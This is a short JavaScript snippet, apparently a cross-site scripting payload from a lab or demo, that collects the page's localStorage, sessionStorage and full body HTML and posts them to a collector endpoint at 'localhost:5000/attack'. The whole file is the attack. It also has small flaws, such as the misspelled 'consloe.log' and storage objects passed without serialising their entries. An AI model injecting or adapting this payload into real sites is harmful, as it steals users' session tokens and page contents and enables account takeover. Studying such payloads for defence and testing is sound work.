const _token = localStorage
const __token = sessionStorage
const _body = document.body.innerHTML
fetch("http://localhost:5000/attack", {
    method: "post",
    headers: {
        "Content-type": "Application/json"
    },
    body: JSON.stringify({
        data: { _token, __token, _body }
    })
}).then((res) => {
    consloe.log(res)
})